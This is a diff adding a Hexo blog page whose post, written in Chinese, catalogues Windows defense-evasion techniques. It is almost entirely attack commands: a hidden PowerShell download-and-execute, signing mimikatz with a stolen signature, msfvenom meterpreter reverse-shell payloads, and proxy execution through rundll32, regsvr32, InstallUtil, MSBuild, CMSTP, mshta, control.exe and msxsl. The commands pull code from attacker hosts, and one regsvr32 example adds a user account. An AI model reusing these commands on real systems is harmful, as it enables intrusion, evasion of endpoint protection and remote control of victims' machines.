@@ -1,0 +1,494 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="麻薯">
+  <meta name="keywords" content="">
+  
+  <title>windows命令执行防御规避总结 - Leticia&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Leticia's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default2.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="windows命令执行防御规避总结">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-15 22:56" pubdate>
+        2021年8月15日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      768 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      12
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">windows命令执行防御规避总结</h1>
+            
+            <div class="markdown-body">
+              <h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">powershell.exe -nop -w hidden -c <span class="hljs-string">\&quot;IEX</span> ((<span class="hljs-keyword">new</span>-object net.webclient).downloadstring(<span class="hljs-string">&#x27;http://xx.xx.xx.xx:8888/logo.gif&#x27;</span>))<span class="hljs-string">\&quot;&quot;</span> /f<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="SIP"><a href="#SIP" class="headerlink" title="SIP"></a>SIP</h2><p>通过sip劫持对恶意代码签名获得系统信任<br><a target="_blank" rel="noopener" href="https://github.com/secretsquirrel/SigThief">https://github.com/secretsquirrel/SigThief</a></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sigthief.<span class="hljs-keyword">py</span> -i consent.<span class="hljs-keyword">exe</span> -t mimikatz.<span class="hljs-keyword">exe</span> -<span class="hljs-keyword">o</span> signed-mimikatz.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="rundll32-exe"><a href="#rundll32-exe" class="headerlink" title="rundll32.exe"></a>rundll32.exe</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">生成<br>msfvenom -<span class="hljs-selector-tag">a</span> x86 --platform windows -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_tcp LHOST=xx<span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span> LPORT=<span class="hljs-number">4444</span> -f dll &gt;xxx.dll<br><br>目标执行<br>rundll32<span class="hljs-selector-class">.exe</span> shell32<span class="hljs-selector-class">.dll</span>,Control_RunDLL xxx.dll<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="Regsvr32-exe"><a href="#Regsvr32-exe" class="headerlink" title="Regsvr32.exe"></a>Regsvr32.exe</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfconsole<br><br>auxiliary<span class="hljs-regexp">/server/</span>regsvr32_command_delivery_server<br>set CMD net user test <span class="hljs-number">123456</span> /add<br><br>目标执行<br>regsvr32 <span class="hljs-regexp">/s /</span>n <span class="hljs-regexp">/u /i</span>:http:<span class="hljs-regexp">//</span>xx.xx.xx.xx:<span class="hljs-number">8080</span>/aPxOb0o scrobj.dll<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="InstallUtil-exe"><a href="#InstallUtil-exe" class="headerlink" title="InstallUtil.exe"></a>InstallUtil.exe</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">1</span>.编译后门：<br>C:\Windows\Microsoft.NET\Framework64\v4.<span class="hljs-number">0.30319</span>&gt;csc.<span class="hljs-keyword">exe</span> /r:System.EnterpriseServices.dll /unsafe /targe<span class="hljs-variable">t:library</span> /<span class="hljs-keyword">ou</span><span class="hljs-variable">t:xxx</span>.<span class="hljs-keyword">exe</span> /keyfile:<span class="hljs-string">&quot;C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\x64\key.snk&quot;</span> xxx.<span class="hljs-keyword">cs</span><br><span class="hljs-number">2</span>.靶机上运行：<br>InstallUtil.<span class="hljs-keyword">exe</span> /U xxx.<span class="hljs-keyword">exe</span><br><span class="hljs-number">3</span>.msf监听,得到反弹的<span class="hljs-keyword">shell</span>：<br><span class="hljs-keyword">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-keyword">set</span> LHOST xx.xx.xx.xx<br><span class="hljs-keyword">set</span> LPORT <span class="hljs-number">4444</span><br>exploit<br></code></pre></td></tr></table></figure>
+
+<h2 id="Msbuild-exe"><a href="#Msbuild-exe" class="headerlink" title="Msbuild.exe"></a>Msbuild.exe</h2><p>MSBuild是Microsoft Build Engine的缩写，代表Microsoft和Visual Studio的新的生成平台,MSBuild可编译特定格式的xml文件</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/3gstudent/msbuild-inline-task">https://github.com/3gstudent/msbuild-inline-task</a></p>
+<p>msf生成shellcode</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=xx.xx.xx.xx <span class="hljs-attribute">lport</span>=4444<br>-f csharp<br></code></pre></td></tr></table></figure>
+
+<p>使用shellcode替换 <a target="_blank" rel="noopener" href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml</a> 中的shellcode部分</p>
+<p>msf监听</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/multi/handler<br><span class="hljs-builtin-name">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-builtin-name">set</span> lhost xx.xx.xx.xx<br><span class="hljs-builtin-name">set</span> lport 4444<br>exploit<br></code></pre></td></tr></table></figure>
+
+<p>运行</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\M</span>icrosoft.NET<span class="hljs-symbol">\F</span>ramework<span class="hljs-symbol">\v</span>4.0.30319<span class="hljs-symbol">\M</span>SBuild.exe exec64.xml<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="CMSTP"><a href="#CMSTP" class="headerlink" title="CMSTP"></a>CMSTP</h2><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cmstp.exe /s /ns C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\a</span>dministrator<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\T</span>emp<span class="hljs-symbol">\X</span>KNqbpzl.txt绕过AppLocker并启动恶意脚本<br></code></pre></td></tr></table></figure>
+
+<h2 id="Mshta-exe"><a href="#Mshta-exe" class="headerlink" title="Mshta.exe"></a>Mshta.exe</h2><p>Mshta.exe 是一个执行 Microsoft HTML 应用程序 (HTA) 的实用程序,攻击者可以使用 mshta.exe 通过受信任的 Windows 实用程序代理执行恶意代码</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">use exploit<span class="hljs-regexp">/windows/mi</span>sc/hta_server<br>msf exploit(windows<span class="hljs-regexp">/misc/</span>hta_server) &gt; set srvhost xx.xx.xx.xx<br>msf exploit(windows<span class="hljs-regexp">/misc/</span>hta_server) &gt; exploit<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mshta.exe http:<span class="hljs-regexp">//</span>xx.xx.xx.xx:<span class="hljs-number">8080</span>/xxxxxxx.hta<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="控制面板"><a href="#控制面板" class="headerlink" title="控制面板"></a>控制面板</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">攻击者可以使用控制面板项作为有效载荷来执行任意命令,控制面板项是注册的可执行文件（.exe）或控制面板（.cpl）文件,可以直接从命令行执行或通过Control_RunDLL（API）调用或者直接双击文件。<br>攻击者构造恶意的dll文件<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">CPIApplet</span>.</span></span>dll<br>利用msf生成dll文件：<br>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<span class="hljs-number">170.170</span>.<span class="hljs-number">64.17</span> LPORT=<span class="hljs-number">4444</span> -f dll &gt; /tmp/<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">CPIApplet</span>.</span></span>dll<br>传入windows机器,然后重命名为<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">CPIApplet</span>.</span></span>cpl,通过control.exe c:\users\administrator\desktop\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">CPIApplet</span>.</span></span>cpl 执行命令<br><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="通过msxsl-exe调用恶意xml文件执行脚本"><a href="#通过msxsl-exe调用恶意xml文件执行脚本" class="headerlink" title="通过msxsl.exe调用恶意xml文件执行脚本"></a>通过msxsl.exe调用恶意xml文件执行脚本</h2><p>制作两个文件</p>
+<p>customers.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;script.xsl&quot; ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">customers</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">customer</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Microsoft<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">customer</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">customers</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>script.xsl</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:msxsl</span>=<span class="hljs-string">&quot;urn:schemas-microsoft-com:xslt&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:user</span>=<span class="hljs-string">&quot;http://mycompany.com/mynamespace&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">msxsl:script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span> <span class="hljs-attr">implements-prefix</span>=<span class="hljs-string">&quot;user&quot;</span>&gt;</span><br>function xml(nodelist) &#123;<br>var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe /k calc.exe&quot;);<br>return nodelist.nextNode().xml;<br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">msxsl:script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;user:xml(.)&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>开启http服务</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>
+
+<p>远程下载执行</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msxsl.exe http:<span class="hljs-regexp">//</span>xx.xx.xx.xx<span class="hljs-regexp">/customers.xml http:/</span><span class="hljs-regexp">/xx.xx.xx.xx/</span>scrip.xsl<br></code></pre></td></tr></table></figure>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/09/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93/">
+                        <span class="hidden-mobile">网络隧道技术总结</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
